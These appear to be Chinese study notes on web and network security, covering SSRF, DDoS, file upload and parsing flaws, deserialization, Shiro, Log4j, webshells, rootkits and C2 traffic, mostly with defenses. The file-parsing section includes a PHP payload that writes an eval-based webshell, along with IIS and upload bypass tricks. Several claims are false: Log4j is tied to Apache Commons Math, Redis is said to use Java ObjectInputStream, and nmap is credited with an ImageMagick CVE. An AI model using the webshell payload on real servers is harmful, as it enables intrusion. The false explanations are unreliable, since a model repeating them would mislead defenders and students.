Token：为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。 4. SSRF（服务端请求伪造）原理： 攻击者通过在受害者服务器上执行恶意代码，使该服务器对指定的目标URL发起网络请求。这种攻击通常利用了开发人员在编写Web应用程序时没有正确处理用户输入数据的漏洞，例如将用户提供的URL参数直接传递给后台服务器而没有做任何验证。 在SSRF攻击中，攻击者可以欺骗Web应用程序向其他服务器发送HTTP请求，例如内部服务器、本地网络资源或公共Web API等。攻击者还可以使用SSRF攻击来绕过防火墙保护，访问内部系统，并执行未授权的操作，例如读取机密数据、修改配置文件或上传恶意文件等。 URL伪协议： file:// 这种URL Schema可以尝试从文件系统中获取文件 dict:// 这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表 sftp:// Sftp代表SSH文件传输协议，或安全文件传输协议，这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作 ldap:// LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议 tftp:// TFTP是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机 gopher:// Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。 防御： 对所有输入进行严格的验证和过滤：开发人员在编写Web应用程序时应对所有输入数据进行严格的验证和过滤，以确保不会将任何恶意代码或非法请求发送到受害者服务器。 使用白名单：开发人员可以使用白名单技术限制应用程序仅向可信的服务器发送请求，例如内部服务器或特定的Web API。 限制服务器端请求发出范围，例如通过禁止或限制特定的协议、域名或IP地址，以避免攻击者可以利用SSRF漏洞来发送恶意请求。 禁止跳转，限制请求的端口为http常用的端口，比如 80、443、8080、8090 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 5. DDOS攻击1.原理攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。2.危害：服务器瘫痪、用户无法正常访问。3.类型（1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK 包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。（2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP 连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP 连接，直到服务器的内存等资源被耗尽而被拖跨， 从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。（3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、 列表等大量耗费数据库资源的调用。一般来说， 提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。4.防御：（1）采用高性能的网络设备，升级主机服务器硬件，保证充足的网络带宽（2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）（3）把网站做成静态页面（4）增强操作系统的TCP/IP栈（5）安装专业抗DDOS防火墙 6. CC攻击原理： CC(ChallengeCollapsar，挑战黑洞)攻击是DDoS攻击的一种类型，攻击者利用众多广泛可用的免费代理服务器模拟多个用户向受害服务器发送大量貌似合法的请求，许多免费代理服务器支持匿名模式，这使追踪变得非常困难 检测： 1、命令行法 一般遭受CC攻击时，Web服务器会出现80端口对外关闭的现象， 因为这个端口已经被大量的垃圾数据堵塞了正常的连接被中止了。可以通过在命令行下输入命令netstat -an来查看， “SYN_RECEIVED”是TCP连接状态标志，意思是“正在处于连接的初始同步状态 ”，表明无法建立握手应答处于等待状态。这就是攻击的特征，一般情况下这样的记录一般都会有很多条，表示来自不同的代理IP的攻击。 2、查看系统日志 Web日志一般在C:\\WINDOWS\\system32\\LogFiles\\HTTPERR目录下，该目录下用类似httperr1.log的日志文件，这个文件就是记录Web访问错误的记录。管理员可以依据日志时间属性选择相应的日志打开进行分析是否Web被CC攻击了。 防御： 1、服务器垂直扩展和水平扩容 资金允许的情况下，这是最简单的一种方法，本质上讲，这个方法并不是针对CC攻击的，而是提升服务本身处理并发的能力，但确实提升了对CC攻击的承载能力。垂直扩展：是指增加每台服务器的硬件能力，如升级CPU、增加内存、升级SSD固态硬盘等。水平扩容：是指通过增加提供服务的服务器来提升承载力。 2、数据缓存(内存级别，不要用文件) 对于服务中具备高度共性，多用户可重用，或单用户多次可重用的数据，一旦从数据库中检索出，或通过计算得出后，最好将其放在缓存中，后续请求均可直接从缓存中取得数据，减轻数据库的检索压力和应用服务器的计算压力，并且能够快速返回结果并释放进程，从而也能缓解服务器的内存压力。要注意的是，缓存不要使用文件形式，可以使用redis、mem—cached等基于内存的nosql缓存服务，并且与应用服务器分离，单独部署在局域网内。局域网内的网络IO肯定比起磁盘IO要高。为了不使局域网成为瓶颈，千兆网络也是有必要的。 3、页面静态化 与数据缓存一样，页面数据本质上也属于数据，常见的手段是生成静态化的html页面文件，利用客户端浏览器的缓存功能或者服务端的缓存服务，以及CDN节点的缓冲服务，均可以降低服务器端的数据检索和计算压力，快速响应结果并释放连接进程。 4、IP限制 可以将IP限制前置至JCb层的防火墙或负载均衡器上去做，并且可以调大限制的阈值，防止恶意访问穿透到应用服务器上，造成应用服务器压力。 5、接入高防 中云AI云防护系统通过用户与防护节点建立加密隧道，接管客户端与服务器端网络连接，准确识别攻击者与真正的访客。 7. 文件上传漏洞原理：文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 相关日志： 文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息 访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传 IP 地址等。 安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。 攻击特征： 文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。 文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。 文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。 大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。 目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。 绕过： 修改文件扩展名：攻击者可以将可执行文件的扩展名更改为其他文件格式的扩展名，例如将.exe文件更改为.jpg文件。这样，即使应用程序检查文件扩展名，也会认为该文件是合法的图像文件。 绕过文件类型检查：应用程序通常会限制上传文件的MIME类型或文件头，以确保只允许上传合法的文件。但是，攻击者可以通过修改文件头或添加特殊字符等方式来伪装文件类型和内容，从而绕过文件类型检查。 前端JS突破：抓包修改文件名 或者 禁用当前浏览器的JS脚本 防御： 文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。 检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。 重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。 存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。 使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。 8. 文件解析漏洞分类： 1.IIS 6.0解析利用方法有两种（1）目录解析：/xx.asp/xx.jpg（2）文件解析：wooyun.asp;.jpg第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx2.Apache解析漏洞后缀名解析漏洞Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。3.PHP CGI解析漏洞在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为 1&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt; 的文件，然后访问wooyun.jpg/x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。4.%00截断漏洞当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 防御：1、防御方法：升级IIS版本，IIS5.1与7.5均无此漏洞2、Apache文件解析漏洞：不要使用AddHandler，改用SetHandler，就不会有解析问题 123&lt;FilesMatch&quot;.+.php$&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 禁止.php这样的文件执行 123&lt;FilesMatch&quot;.+.ph(p[3457]?|t|tml).&quot;&gt;Require all denied&lt;/FilesMatch&gt; 9. 文件包含漏洞原理： 文件包含方式：Web应用程序通常会使用动态脚本语言（如PHP、ASP等）来动态地生成网页内容。其中，文件包含函数（如include、require等）允许将一个文件的内容嵌入到另一个文件中，以实现模块化和重用性。当Web应用程序采用用户输入作为文件路径参数时，如果未对这些参数进行足够的过滤和验证，就可能导致恶意数据或代码被动态地加载到页面中。攻击者可以通过向文件路径参数中注入恶意代码或文件名来触发文件包含漏洞，并在服务器上执行恶意操作。例如，攻击者可以上传一个包含恶意代码的文件，并将其作为文件路径参数传递给目标服务器，从而执行恶意操作。 防御： 过滤和验证用户输入：在接收用户输入作为文件路径参数时，必须对其进行过滤和验证，确保其中不包含任何恶意数据或代码。 使用绝对路径而非相对路径，以避免攻击者通过注入如../等文件路径跳出当前目录并访问其他文件。 限制访问范围：为了防止攻击者利用文件包含漏洞攻击服务器上的敏感文件，可以通过配置文件访问权限和文件夹安全策略等方式来限制访问范围。 升级和更新软件：Web应用程序中经常会存在许多漏洞和安全风险，因此需要及时升级和更新相关软件和组件，以确保最新的补丁和安全措施已经被采纳。 10. 中间件常见漏洞 Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。 数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。 应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。 消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。 缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。 中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。 11. 挖矿病毒判断： 当我们的服务器或PC资源(CPU)使用率接近或超过100%，并持续高居不下导致服务器或PC操作延缓，我们就可以判定被挖矿 防御： 及时更新杀毒软件，并开启实时保护模式； 扫描整个系统，清除所有恶意文件和注册表项； 禁止不明程序自启动，及时关闭被感染的进程； 在安装软件时仔细阅读许可协议，禁止安装未知来源的软件； 加强账户权限管理，限制非管理员用户对系统的操作权限； 及时备份重要文件，以便在恶意软件攻击后恢复数据。 Linux确认挖矿a. 使用top命令查看系统性能，找出消耗资源较高的进程PID； b. 根据获取的PID信息利用ps -ef -p PID命令找出系统进程详细信息； c. 根据进程详细信息定位到文件位置，进入文件位置进行文件分析，确认是否属于挖矿程序。 d. 停止服务：systemctl stop *.service； 杀掉进程：kill 9 PID，很多时候不光杀掉一个进程； 删除文件：rm -fr abnormal_file，删除文件时可以使用find / -name abnormal_file查找出系统中所有的恶意文件； 清理定时任务：crontab -e； Windows确认挖矿 使用图形化界面分析确认 a. 打开任务管理器：Ctrl + Alt + Delete 快捷键 或者 win + r 快捷键，输入 taskmgr； b. 在任务管理器中找到资源管理器； c. 通过资源管理器找到占用CPU资源较高的服务或进程，获取其PID信息； d. 利用获取的PID信息在任务管理器中的详细信息一栏中找到对应的程序，右键打开文件位置，获取异常文件目录； e. 进入到异常文件目录中，对文件进行分析，确认是否属于挖矿程序； f. 确认挖矿程序后，先对挖矿程序进行备份。然后先关闭对应的服务与进程，再删除对应的定时任务，最后删除对应的文件。在删除文件之后，反向再查询一遍定时任务、进程与服务，最好是在间隔一定时间段后再复查一次 12. webshell原理：Webshell是一种Web服务器上的恶意代码，可以使攻击者远程控制服务器，并执行各种命令、上传下载文件等操作防御： 配置必要的防火墙，并开启防火墙策略，防止暴露不必要的服务为攻击者提供利用条件。 对服务器进行安全加固，例如，关闭远程桌面功能、定期更换密码、禁止使用最高权限用户运行程序、使用 HTTPS 加密协议等。 加强权限管理，对敏感目录进行权限设置，限制上传目录的脚本执行权限，不允许配置执行权限等。 安装 Webshell 检测工具，根据检测结果对已发现的可疑 Webshell 痕迹立即隔离查杀，并排查漏洞。 排查程序存在的漏洞，并及时修补漏洞。可以通过专业人员的协助排查漏洞及入侵原因。 时常备份数据库等重要文件。 需要保持日常维护，并注意服务器中是否有来历不明的可执行脚本文件。 采用白名单机制上传文件，不在白名单内的一律禁止上传，上传目录权限遵循最小权限原则。 13. 钓鱼邮件原理：伪装成合法的邮件，诱骗收件人点击链接或输入个人信息，从而达到窃取用户信息、密码或者安装恶意软件的目的。钓鱼邮件常常伪装成银行、电商、社交媒体等常见网站的邮件，利用用户对这些网站的信任感，诱导用户点击邮件中的链接或下载附件，从而实施攻击 防御： 查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。 检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。 注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。 尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。 安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的 Password Alert 等。 14. fastjson原理： 使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type来试图把JSON内容反序列化为对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。常见的有sun官方提供的一个类com.sum.rowset.JdbcRowSetlmpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用。 漏洞复现： 防御： 避免直接将未经过验证的用户输入传递给 fastjson 反序列化器 及时更新 fastjson 序列化库，以确保其安全性 使用其他序列化和反序列化库，例如Gson和Jackson等，来避免fastjson漏洞的风险 15. shiro原理： Apache Shiro框架提供了记住密码的功能(RememberMe)，用户登录成功后会将用户信息加密，加密过程：用户信息-》序列化-》AES加密-》BASE64编码-》RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的RememberMe字段里面，在服务端收到请求对RememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;=1.2.4中使用了默认密钥kPH+blx5D2deZilxcaaaA==，更容易触发RCE漏洞 防御： 避免直接从未经过验证的输入数据中反序列化对象。 限制反序列化器（如 ObjectInputStream）的使用，只反序列化可信来源的数据。 及时更新Shiro框架，以确保漏洞已被修复。 将Shiro部署在安全环境中，并使用网络隔离、网络监控和入侵检测等技术来加强安全控制。 shiro550和721的区别： 主要在于shiro550使用已知密钥碰撞，只要有足够密钥库，不需要RememberMe Cookie shiro721的AES加密的key基本猜不到，系统随机生成，可使用登录后的rememberme去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造RememberMe Cookie值来实现反序列化漏洞攻击，难度高 16. log4j原理： Log4j是Java中广泛使用的一种日志管理工具，攻击者可以利用Log4j来执行任意代码，以下是此漏洞的原理：Log4j依赖于Apache Commons Math库中的一个子模块以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用。攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。 危害： 远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。 远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。 防御： 更新Log4j版本：最新版本已经修复了此漏洞。 关闭JNDI：如果您不需要使用JNDI，建议禁用该功能。 阻止外部网络访问：对于架构设计合理的应用程序，应该使用网络隔离等技术来限制外部访问。 加强应用程序安全性：开发人员应该定期审计和更新应用程序代码，以确保其安全性和完整性。 补充：weblogicweblogic是Oracle发布的一个基于JAVA架构的web中间件，可以理解为tomcat promax 漏洞利用： 直接通过T3发送恶意反序列化对象 利用T3协议配合RMP或ND接口反向发送反序列化数据 通过javabean XML方式发送反序列化数据 17. redis（缓存服务器）原理：Ridic反序列化漏洞的根本原因是，Redis使用了Java标准库中的ObjectInputStream类来处理数据的序列化和反序列化。攻击者可以通过构造恶意请求，并将其发送到目标Redis服务器上，以触发ObjectInputStream在处理该数据时执行恶意代码的情况。 危害： 提升权限：攻击者可以通过远程执行任意代码进一步攻击目标系统，例如窃取敏感信息、破坏系统完整性、创建后门等。 篡改数据：攻击者可以修改Redis数据库中的数据，例如覆盖现有数据、添加新的键值对等。 删除数据：攻击者可以利用此漏洞删除Redis数据库中的数据，包括重要的配置文件、认证令牌等。 防御： 不要直接将未经过验证的用户输入数据存储在Redis数据库中。 更新Redis版本以确保漏洞已修复。 配置Redis服务器的安全设置，例如限制网络访问和使用密码进行身份验证等。 启用日志记录并监测Redis服务器上的异常活动。 将Redis服务器部署在安全环境中，并定期对其进行安全审计。 18. nmap CVE-2016-3714: ImageMagick命令注入漏洞 Nmap使用ImageMagick库来处理图像，在旧版本的ImageMagick中存在命令注入漏洞。攻击者可以构造恶意图像文件，通过Nmap执行这些文件的时候触发该漏洞，导致执行任意命令。 CVE-2017-11615：脚本引擎环境变量注入漏洞 Nmap支持在其脚本引擎中执行Lua脚本，而在某些情况下，攻击者可以利用环境变量注入漏洞来执行恶意Lua脚本，从而危及系统安全。 CVE-2018-15173: 路径遍历漏洞 该漏洞存在于Nmap HTTP服务器中，攻击者可以利用此漏洞通过HTTP服务在目标系统上执行任意命令 防御：这些漏洞大多数已经被修复，并且很少会对最新版本的Nmap构成威胁。建议用户始终使用最新版本的Nmap，并遵循最佳实践，如限制对Nmap的访问权限，避免使用默认帐户和密码，以及定期更新配置文件等。 19. 反序列化漏洞与JAVA内存马原理：网站暴露或间接暴露反序列化 API，导致攻击者构造恶意对象并上传到服务器触发反序列化过程，调用反序列化函数如_wakeup、_destruct等，攻击者可以实现自定义这些反序列化函数的参数从而引发漏洞 Java反序列化检测： 从流量中发现序列化的痕迹，关键字：ac ed 00 05，rO0AB Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是1099端口 从源码入手，可以被序列化的类一定实现了Serializable接口 观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处 防范： 类白名单校验：在 ObjectInputStream 中 resolveClass 里只是进行了 class 是否能被 load ，自定义 ObjectInputStream , 重载 resolveClass 的方法，对 className 进行白名单校验 禁止 JVM 执行外部命令 Runtime.exec 内存马分类： 1、基于动态添加Servlet组件的内存马 2、基于动态添加框架组件的内存马 3、基于Javaagent和Javassist技术的内存马 特征： 内存马的特性就是无文件落地，只存在内存中，这就代表了这个类对应的Resource是不在本地文件系统中的，那么其Class File/Location/Loader相较于应用正常的组件会有一定的区别。 因为内存马毕竟最后还是要依赖框架的功能来实现的，必然会继承或实现框架的接口，在应用自身提供的接口不多的情况下，通过遍历所有的servlet/filter/listener进行审计也是一种检测的策略 排查： 如果是jsp注入，日志中排查可疑jsp的访问请求。 如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法 根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。 如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。 如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200 防御： 正常内存马重启以后就没有了 可以做内存镜像，反编译.class，看具体代码，然后注入进去，覆写相关的恶意类即可 也可以做比对，看是否新增恶意的类 20. Rookit分类： 用户态Rootkit：一般通过覆盖系统二进制和库文件来实现 特点： 通常替换的二进制文件为ps、netstat、du、ping、lsof、ssh、sshd等 可能使用环境变量LD_PRELOAD和/etc/ld.so.preload、/etc/ld.so.conf等加载黑客自定义的恶意库文件来实现隐藏 可能直接在现有进程中加载恶意模块来实现隐藏 不依赖于内核 内核态Rootkit：通常通过可加载内核模块（LoadableKernel Module，LKM）将恶意代码被直接加载进内核中。 特点： 直接访问/dev/{k,}mem 更加隐蔽，更难以检测，通常包含后门 排查： 利用Chkrootkit检查Rootkit 利用Rkhunter检查Rootkit 就是将一些重要的文件作MD5，定期检查MD5是否有改变 常见功能：隐藏文件、进程、连接、模块等 21. 蠕虫原理：蠕虫病毒是一种智能化、自动化并综合网络攻击、密码学和计算机病毒技术，可自行运行的攻击程序或代码。蠕虫病毒能够扫描和攻击网络上存在系统漏洞的节点主机，并通过网络自主的从一个节点传播到另一个节点。 主要攻击方法： Rsh，rexec：用户的缺省认证 Sendmail 的debug模式 Fingerd的缓冲区溢出 口令猜测 特征： 主动攻击：从搜索漏洞，到利用搜索结果攻击系统，再到攻击成功后复制副本，整个流程全由蠕虫自身主动完成。 利用软件漏洞：蠕虫利用系统的漏洞获得被攻击的计算机系统的相应权限，使之进行复制和传播过程成为可能。 造成网络拥塞：在传播的过程中，蠕虫需要判断其它计算机是否存活；判断特定应用服务是否存在；判断漏洞是否存在等等，这将产生大量的网络数据流量。同时出于攻击网络的需要，蠕虫也可以产生大量恶意流量，当大量的机器感染蠕虫时，就会产生巨大的网络流量，导致整个网络瘫痪。 留下安全隐患：大部分蠕虫会搜集、扩散、暴露系统敏感信息（如用户信息等），并在系统中留下后门。 行踪隐蔽：蠕虫的传播过程中，不需要用户的辅助工作，其传播的过程中用户基本上不可察觉。 反复性：即使清除了蠕虫留下的任何痕迹，如果没有修补计算机系统漏洞，网络中的计算机还是会被重新感染。 破坏性：越来越多的蠕虫开始包含恶意代码，破坏被攻击的计算机系统，而且造成的经济损失数目越来越大。 防御： 系统漏洞打补丁：蠕虫病毒大多数都是利用系统漏洞进行传播的，因此在清除蠕虫病毒之前必须将蠕虫病毒利用的相关漏洞进行修补。 清除正在运行的蠕虫进程：每个进入内存的蠕虫一般会以进程的形式存在，只要清除了该进程，就可以使蠕虫失效。 删除蠕虫病毒的自启动项：感染蠕虫主机用户一般不可能启动蠕虫病毒，蠕虫病毒需要就自己启动。需要在这些自启动项中清除蠕虫病毒的设置。 删除蠕虫文件：可以通过蠕虫在注册表的键值可以知道病毒的躲藏位置，对于那些正在运行或被调用的文件无法直接删除，借助相关工具删除。 利用自动防护工具：通过包括个人防火墙软件等防护工具，可以设置禁止不必要的服务。另外也可以设置监控自己主机有那些恶意的流量。 22. XXE漏洞原理：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。 特征：在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。 漏洞利用： 有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为 blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据 防御： XXE漏洞归根结底在于XML文档解析引入外部实体，禁止加载外部实体。 使用安全的libxml依赖库，版本在2.9以上的版本 流量特征1. cs （client/server）cs流量是指基于客户端和服务器之间的通信产生的网络流量。C/S 流量特征包括以下几个方面： cs的流量特征：50050端口，心跳包 会话建立：C/S 流量通常都需要进行会话建立，包括握手、协议版本交换、密钥协商等过程。在这个过程中，通常可以看到一些特定的协议字段和标志位。 数据传输：传输数据是 C/S 流量的主要特征之一。在这个过程中，通常可以看到明文或加密的数据传输，并且数据大小和传输速度也是分析流量的重要指标。 响应时间：C/S 流量通常包含请求和响应消息，因此可以通过分析请求和响应之间的时间差来判断系统性能和服务质量。 协议类型：C/S 流量涉及多种不同的协议类型，例如 HTTP、FTP、SMTP、POP3 等，每种协议的特点和流量特征也有所不同。 应用程序特点：C/S 流量还表现出应用程序的特点，例如应用程序的请求方式、请求频率、用户行为等等 2. msfMSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面： 目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。 异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。 频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。 数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。 特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等 3. 冰蝎3.0： content-type Accept&amp;Cache-Control 内置16个ua头 content-length请求长度 4.0：v3.0 和 v4.0 的区别很明显在于这里 $_SESSION[&#39;k&#39;]=$key，v3.0 版本当中会把 key 作为 session 传入；接着判断 extension_loaded，也就是判断服务端是否存在 openssl拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 xor_base64加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 aes加密方式。 使用HTTP协议：冰蝎使用HTTP协议与C&amp;C服务器通信，从而绕过网络策略和防火墙的检测。 自定义加密：冰蝎使用自定义加密算法对数据进行加密，以避免被网络监测器和安全设备检测到。 动态命令: 通过inline和eval函数动态执行指令并返回结果，这使得冰蝎可以运行各种自定义代码，例如扫描目标、下载和安装其他恶意软件等。 内存驻留: 冰蝎不需要在受感染设备上安装文件或建立持久性，它只需要注入进程并在内存中驻留，从而难以被传统杀毒软件检测和清除。 支持多平台：冰蝎支持Windows, Linux, and Mac OS等操作系统，这使得攻击者可以在跨多个平台上远程控制受感染设备。 4. 蚁剑 5. 菜刀 6. sql注入分两个维度吧，一个是应用本身产生的，一个是真实的攻击，比如说因为出现select关键字而触发安全设备告警的情况下，首先需要判断下是不是SQL语句还是参数名为select关键字导致的误报，如果不是误报，那就看SQL语句写的是啥，判断是否有危害，还是业务的SQL语句，可以看里面是不是包含恶意的函数或者敏感的高危操作，如果都没有那就跟业务去确认是不是应用本身代码设计缺陷导致直接把SQL语句在参数中传输 7. 哥斯拉 端口 端口 21（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。 端口 22（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。 端口 23（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。 端口 25（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。 端口 53（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。 端口 80/443（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。 端口 135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。 端口 139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。 端口 3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。 6379：redis 7001：weblogic 8080：TCP、HTTP协议代理服务器，Apache-tomcat默认端口号 杂项1. 判断误报真正的攻击会大量的占用网络空间，传输效率会降低，占用大量带宽，对系统造成损害，没有的话就是误报。 其次可以去观察请求特征，与正常的业务是否一样，去做一个对比 